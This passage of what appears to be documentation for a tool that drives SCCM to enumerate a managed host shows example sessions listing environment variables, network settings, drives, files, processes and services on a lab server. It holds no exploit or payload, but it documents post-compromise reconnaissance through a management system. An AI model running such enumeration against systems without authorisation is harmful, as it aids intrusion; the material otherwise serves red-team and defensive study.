                    | <SYSTEM>\PSModulePath             | <SYSTEM>\PSModulePath             | PSModulePath           | OK       | True             | <SYSTEM>                     |            
                    %ProgramFiles%\WindowsPowerShell\Modules;%SystemRoot%\system32\WindowsPowerShell\v1.0\Modules                                              | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | <SYSTEM>\TEMP                     | <SYSTEM>\TEMP                     | TEMP                   | OK       | True             | <SYSTEM>                     |            
                    %SystemRoot%\TEMP                                                                                                                          | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | <SYSTEM>\TMP                      | <SYSTEM>\TMP                      | TMP                    | OK       | True             | <SYSTEM>                     |            
                    %SystemRoot%\TEMP                                                                                                                          | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | <SYSTEM>\USERNAME                 | <SYSTEM>\USERNAME                 | USERNAME               | OK       | True             | <SYSTEM>                     | SYSTEM     
                    | DP       |                                                                                                                                                               
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | <SYSTEM>\windir                   | <SYSTEM>\windir                   | windir                 | OK       | True             | <SYSTEM>                     |            
                    %SystemRoot%                                                                                                                               | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | <SYSTEM>\NUMBER_OF_PROCESSORS     | <SYSTEM>\NUMBER_OF_PROCESSORS     | NUMBER_OF_PROCESSORS   | OK       | True             | <SYSTEM>                     | 2          
                    | DP       |                                                                                                                                                               
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | <SYSTEM>\PROCESSOR_LEVEL          | <SYSTEM>\PROCESSOR_LEVEL          | PROCESSOR_LEVEL        | OK       | True             | <SYSTEM>                     | 6          
                    | DP       |                                                                                                                                                               
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | <SYSTEM>\PROCESSOR_IDENTIFIER     | <SYSTEM>\PROCESSOR_IDENTIFIER     | PROCESSOR_IDENTIFIER   | OK       | True             | <SYSTEM>                     | Intel64    
                    Family 6 Model 140 Stepping 1, GenuineIntel                                                                                        | DP       |                            
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | <SYSTEM>\PROCESSOR_REVISION       | <SYSTEM>\PROCESSOR_REVISION       | PROCESSOR_REVISION     | OK       | True             | <SYSTEM>                     | 8c01       
                    | DP       |                                                                                                                                                               
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | <SYSTEM>\UATDATA                  | <SYSTEM>\UATDATA                  | UATDATA                | OK       | True             | <SYSTEM>                     |            
                    C:\Windows\CCM\UATData\D9F8C395-CAB8-491d-B8AC-179A1FE1BE77                                                                                | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | NT AUTHORITY\SYSTEM\Path          | NT AUTHORITY\SYSTEM\Path          | Path                   | OK       | False            | NT AUTHORITY\SYSTEM          |            
                    %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;                                                                                         | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | NT AUTHORITY\SYSTEM\TEMP          | NT AUTHORITY\SYSTEM\TEMP          | TEMP                   | OK       | False            | NT AUTHORITY\SYSTEM          |            
                    %USERPROFILE%\AppData\Local\Temp                                                                                                           | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | NT AUTHORITY\SYSTEM\TMP           | NT AUTHORITY\SYSTEM\TMP           | TMP                    | OK       | False            | NT AUTHORITY\SYSTEM          |            
                    %USERPROFILE%\AppData\Local\Temp                                                                                                           | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | NT AUTHORITY\LOCAL SERVICE\Path   | NT AUTHORITY\LOCAL SERVICE\Path   | Path                   | OK       | False            | NT AUTHORITY\LOCAL SERVICE   |            
                    %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;                                                                                         | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | NT AUTHORITY\LOCAL SERVICE\TEMP   | NT AUTHORITY\LOCAL SERVICE\TEMP   | TEMP                   | OK       | False            | NT AUTHORITY\LOCAL SERVICE   |            
                    %USERPROFILE%\AppData\Local\Temp                                                                                                           | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | NT AUTHORITY\LOCAL SERVICE\TMP    | NT AUTHORITY\LOCAL SERVICE\TMP    | TMP                    | OK       | False            | NT AUTHORITY\LOCAL SERVICE   |            
                    %USERPROFILE%\AppData\Local\Temp                                                                                                           | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | NT AUTHORITY\NETWORK SERVICE\Path | NT AUTHORITY\NETWORK SERVICE\Path | Path                   | OK       | False            | NT AUTHORITY\NETWORK SERVICE |            
                    %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;                                                                                         | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | NT AUTHORITY\NETWORK SERVICE\TEMP | NT AUTHORITY\NETWORK SERVICE\TEMP | TEMP                   | OK       | False            | NT AUTHORITY\NETWORK SERVICE |            
                    %USERPROFILE%\AppData\Local\Temp                                                                                                           | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | NT AUTHORITY\NETWORK SERVICE\TMP  | NT AUTHORITY\NETWORK SERVICE\TMP  | TMP                    | OK       | False            | NT AUTHORITY\NETWORK SERVICE |            
                    %USERPROFILE%\AppData\Local\Temp                                                                                                           | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | DP\Administrator\Path             | DP\Administrator\Path             | Path                   | OK       | False            | DP\Administrator             |            
                    %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;                                                                                         | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | DP\Administrator\TEMP             | DP\Administrator\TEMP             | TEMP                   | OK       | False            | DP\Administrator             |            
                    %USERPROFILE%\AppData\Local\Temp                                                                                                           | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | DP\Administrator\TMP              | DP\Administrator\TMP              | TMP                    | OK       | False            | DP\Administrator             |            
                    %USERPROFILE%\AppData\Local\Temp                                                                                                           | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | LAB\Administrator\Path            | LAB\Administrator\Path            | Path                   | OK       | False            | LAB\Administrator            |            
                    %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;                                                                                         | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | LAB\Administrator\TEMP            | LAB\Administrator\TEMP            | TEMP                   | OK       | False            | LAB\Administrator            |            
                    %USERPROFILE%\AppData\Local\Temp                                                                                                           | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
                    | LAB\Administrator\TMP             | LAB\Administrator\TMP             | TMP                    | OK       | False            | LAB\Administrator            |            
                    %USERPROFILE%\AppData\Local\Temp                                                                                                           | DP       |                    
                    +-----------------------------------+-----------------------------------+------------------------+----------+------------------+------------------------------+------------
                    --------------------------------------------------------------------------------------------------------------------------------+----------+                               
(16777221) (C:\) >> 
```

# ipconfig
### Description
### Usage
### Example
```
(16777221) (C:\) >> ipconfig 
[19:42:23] INFO     Tasked SCCM to run IPCONFIG.                                                                                                                                               
[19:42:27] INFO     Got OperationId 16779670. Sleeping 10 seconds to wait for host to call home.                                                                                               
[19:42:39] INFO     +------------------+--------------+--------------------------------------------+----------+---------------+----------------------+-----------------------------+----------+
                    | InterfaceAlias   | Name         | InterfaceDescription                       | Status   | IPV4Address   | IPV4DefaultGateway   | DNSServerList               | Device   |
                    +==================+==============+============================================+==========+===============+======================+=============================+==========+
                    | Ethernet0        | internal.lab | Intel(R) 82574L Gigabit Network Connection | Up       | 10.10.100.11  | 10.10.100.10         | 10.10.100.100; 10.10.100.10 | DP       |
                    +------------------+--------------+--------------------------------------------+----------+---------------+----------------------+-----------------------------+----------+
(16777221) (C:\) >> 
```

# list_disk
### Description
### Usage
### Example
```
(16777221) (C:\) >> list_disk 
[19:43:02] INFO     Tasked SCCM to show mounted drives on 16777221.                                                                                                                            
[19:43:04] INFO     Got OperationId 16779671. Sleeping 10 seconds to wait for host to call home.                                                                                               
[19:43:17] INFO     +------------------+-----------+------------+----------+                                                                                                                   
                    | Description      | Caption   | DeviceID   | Device   |                                                                                                                   
                    +==================+===========+============+==========+                                                                                                                   
                    | Local Fixed Disk | C:        | C:         | DP       |                                                                                                                   
                    +------------------+-----------+------------+----------+                                                                                                                   
                    | CD-ROM Disc      | nan       | D:         | DP       |                                                                                                                   
                    +------------------+-----------+------------+----------+                                                                                                                   
(16777221) (C:\) >> 
```

# ls
### Description
### Usage
### Example
```
(16777221) (C:\) >> ls
[19:43:31] INFO     Tasked SCCM to list files in C:\.                                                                                                                                          
[19:43:33] INFO     Got OperationId 16779672. Sleeping 10 seconds to wait for host to call home.                                                                                               
[19:43:47] INFO     +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | FileName                     | Mode   | LastWriteTime       |   Size | Device   |                                                                                        
                    +==============================+========+=====================+========+==========+                                                                                        
                    | C:\$Recycle.Bin              | d--hs- | 2024-01-27 06:07:22 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\$WinREAgent               | d--h-- | 2024-01-27 14:07:43 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\Documents and Settings    | d--hsl | 2024-01-27 21:59:32 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\inetpub                   | d----- | 2024-01-27 20:31:16 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\PerfLogs                  | d----- | 2021-05-08 08:20:24 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\Program Files             | d-r--- | 2024-01-27 16:25:43 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\Program Files (x86)       | d----- | 2021-05-08 09:40:21 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\ProgramData               | d--h-- | 2024-01-27 18:18:42 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\Recovery                  | d--hs- | 2024-01-27 21:59:42 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\SCCMContentLib            | d----- | 2024-02-07 06:00:41 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\SMSPKGC$                  | d----- | 2024-02-07 06:00:46 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\SMSSIG$                   | d----- | 2024-02-07 06:00:50 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\SMS_DP$                   | d----- | 2024-02-07 06:00:57 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\System Volume Information | d--hs- | 2024-01-27 05:50:36 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\Users                     | d-r--- | 2024-01-27 06:07:15 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
                    | C:\Windows                   | d----- | 2024-02-07 06:00:30 |      1 | DP       |                                                                                        
                    +------------------------------+--------+---------------------+--------+----------+                                                                                        
(16777221) (C:\) >> 
```

# osinfo
### Description
### Usage
### Example
```
(16777221) (C:\) >> osinfo
[19:45:22] INFO     Tasked SCCM to show system info of 16777221.                                                                                                                               
[19:45:25] INFO     Got OperationId 16779673. Sleeping 10 seconds to wait for host to call home.                                                                                               
[19:45:35] INFO     +---------------------------------------------------+------------+------------------+----------+                                                                           
                    | Caption                                           | Version    | OSArchitecture   | Device   |                                                                           
                    +===================================================+============+==================+==========+                                                                           
                    | Microsoft Windows Server 2022 Standard Evaluation | 10.0.20348 | 64-bit           | DP       |                                                                           
                    +---------------------------------------------------+------------+------------------+----------+ 
```

# ps
### Description
### Usage
### Example
```
(16777221) (C:\) >> ps
[19:45:52] INFO     Tasked SCCM to list processes.                                                                                                                                             
[19:45:53] INFO     Got OperationId 16779674. Sleeping 10 seconds to wait for host to call home.                                                                                               
[19:46:04] INFO     No results yet, sleeping 10 seconds.                                                                                                                                       
[19:46:16] INFO     +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | Name                |   ProcessId | CreationDate        |   WorkingSetSize |   HandleCount | Device   |                                                                  
                    +=====================+=============+=====================+==================+===============+==========+                                                                  
                    | System Idle Process |           0 | 2024-01-30 02:48:49 |             8192 |             0 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | System              |           4 | 2024-01-30 02:48:49 |           151552 |          1420 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | Registry            |         100 | 2024-01-30 02:48:43 |         75931648 |             0 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | smss.exe            |         300 | 2024-01-30 02:48:49 |          1298432 |            57 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | csrss.exe           |         408 | 2024-01-30 02:48:50 |          6266880 |           385 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | csrss.exe           |         504 | 2024-01-30 02:48:50 |          5976064 |           166 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | wininit.exe         |         512 | 2024-01-30 02:48:50 |          7131136 |           152 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | winlogon.exe        |         568 | 2024-01-30 02:48:50 |         10612736 |           200 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | services.exe        |         636 | 2024-01-30 02:48:50 |         12730368 |           394 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | lsass.exe           |         656 | 2024-01-30 02:48:50 |         20844544 |          1136 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |         764 | 2024-01-30 02:48:50 |         17039360 |          4808 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | fontdrvhost.exe     |         792 | 2024-01-30 02:48:51 |          3424256 |            33 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | fontdrvhost.exe     |         800 | 2024-01-30 02:48:51 |          3547136 |            33 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |         880 | 2024-01-30 02:48:51 |         28827648 |           655 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | LogonUI.exe         |         976 | 2024-01-30 02:48:51 |         51191808 |           444 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | dwm.exe             |        1000 | 2024-01-30 02:48:51 |         46243840 |           623 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |         264 | 2024-01-30 02:48:51 |         12832768 |           462 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |         496 | 2024-01-30 02:48:51 |         27467776 |           621 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |         788 | 2024-01-30 02:48:51 |         24920064 |           899 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |         892 | 2024-01-30 02:48:51 |         22437888 |           849 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |         968 | 2024-01-30 02:48:51 |          8105984 |           208 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |        1100 | 2024-01-30 02:48:51 |         27033600 |           808 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |        1252 | 2024-01-30 02:48:51 |         17547264 |           415 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |        1296 | 2024-01-30 02:48:51 |         68280320 |          2607 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |        1380 | 2024-01-30 02:48:51 |         17334272 |           328 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |        1420 | 2024-01-30 02:48:51 |          9187328 |           274 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |        1640 | 2024-01-30 02:48:52 |          6451200 |           134 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |        1908 | 2024-01-30 02:48:52 |          7553024 |           162 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | spoolsv.exe         |        2000 | 2024-01-30 02:48:52 |         17031168 |           451 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |        1172 | 2024-01-30 02:48:52 |         11505664 |           166 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |        1324 | 2024-01-30 02:48:52 |         34709504 |           523 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | vmtoolsd.exe        |        1444 | 2024-01-30 02:48:52 |         25067520 |           394 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |        2040 | 2024-01-30 02:48:52 |         12726272 |           236 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | inetinfo.exe        |        2088 | 2024-01-30 02:48:52 |         17100800 |           202 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | VGAuthService.exe   |        2100 | 2024-01-30 02:48:52 |         12648448 |           174 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | vm3dservice.exe     |        2112 | 2024-01-30 02:48:52 |          6574080 |           120 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | wlms.exe            |        2120 | 2024-01-30 02:48:52 |          3788800 |            58 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |        2144 | 2024-01-30 02:48:52 |          9125888 |           200 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | vm3dservice.exe     |        2468 | 2024-01-30 02:48:53 |          6643712 |           114 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | AggregatorHost.exe  |        2804 | 2024-01-30 02:48:54 |          4718592 |            88 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | dllhost.exe         |        2976 | 2024-01-30 10:58:06 |         14635008 |           268 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | msdtc.exe           |        3348 | 2024-01-30 10:58:06 |         10903552 |           229 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | WmiPrvSE.exe        |        3792 | 2024-01-30 10:58:09 |         31223808 |           496 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | vm3dservice.exe     |        2852 | 2024-01-30 10:59:05 |          6664192 |           115 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | CcmExec.exe         |        2340 | 2024-01-30 11:00:03 |         56483840 |          1215 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | WmiPrvSE.exe        |         520 | 2024-01-30 11:00:03 |         13279232 |           184 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | WmiPrvSE.exe        |        3868 | 2024-01-30 11:00:05 |          9043968 |           161 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | WmiPrvSE.exe        |        2268 | 2024-01-30 11:00:09 |         66949120 |           617 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |         924 | 2024-01-30 11:00:10 |         13742080 |           142 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | svchost.exe         |        4476 | 2024-02-02 21:02:38 |         17772544 |           314 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | conhost.exe         |        1516 | 2024-02-08 03:38:34 |         13377536 |           144 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | WmiPrvSE.exe        |        3028 | 2024-02-08 03:45:33 |          8605696 |           158 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
                    | powershell.exe      |        2180 | 2024-02-08 03:46:02 |        104079360 |           574 | DP       |                                                                  
                    +---------------------+-------------+---------------------+------------------+---------------+----------+                                                                  
(16777221) (C:\) >> 
```

# services
### Description
### Usage
### Example
```
(16777221) (C:\) >> services 
[19:47:25] INFO     Tasked SCCM to list services.                                                                                                                                                                                      
[19:47:27] INFO     Got OperationId 16779676. Sleeping 10 seconds to wait for host to call home.                                                                                                                                       
[19:47:38] INFO     +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Name                                     | PathName                                                                                 |   ProcessId | ServiceType   | Started   | Device   |                       
                    +==========================================+==========================================================================================+=============+===============+===========+==========+                       
                    | AJRouter                                 | C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p                      |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | ALG                                      | C:\Windows\System32\alg.exe                                                              |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | AppHostSvc                               | C:\Windows\system32\svchost.exe -k apphost                                               |        1172 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | AppIDSvc                                 | C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p                      |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Appinfo                                  | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | AppMgmt                                  | C:\Windows\system32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | AppReadiness                             | C:\Windows\System32\svchost.exe -k AppReadiness -p                                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | AppVClient                               | C:\Windows\system32\AppVClient.exe                                                       |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | AppXSvc                                  | C:\Windows\system32\svchost.exe -k wsappx -p                                             |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | AudioEndpointBuilder                     | C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | Audiosrv                                 | C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p                      |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | AxInstSV                                 | C:\Windows\system32\svchost.exe -k AxInstSVGroup                                         |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | BFE                                      | C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p                      |        1252 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | BITS                                     | C:\Windows\System32\svchost.exe -k netsvcs -p                                            |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | BrokerInfrastructure                     | C:\Windows\system32\svchost.exe -k DcomLaunch -p                                         |         764 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | bthserv                                  | C:\Windows\system32\svchost.exe -k LocalService -p                                       |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | camsvc                                   | C:\Windows\system32\svchost.exe -k appmodel -p                                           |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | CcmExec                                  | C:\Windows\CCM\CcmExec.exe                                                               |        2340 | Own Process   | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | CDPSvc                                   | C:\Windows\system32\svchost.exe -k LocalService -p                                       |         892 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | CertPropSvc                              | C:\Windows\system32\svchost.exe -k netsvcs                                               |        1640 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | ClipSVC                                  | C:\Windows\System32\svchost.exe -k wsappx -p                                             |           0 | Share Process | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | CmRcService                              | C:\Windows\CCM\RemCtrl\CmRcService.exe                                                   |           0 | Own Process   | False     | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | COMSysApp                                | C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}        |        2976 | Own Process   | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | CoreMessagingRegistrar                   | C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p                              |        1380 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
                    | CryptSvc                                 | C:\Windows\system32\svchost.exe -k NetworkService -p                                     |        1100 | Share Process | True      | DP       |                       
                    +------------------------------------------+------------------------------------------------------------------------------------------+-------------+---------------+-----------+----------+                       
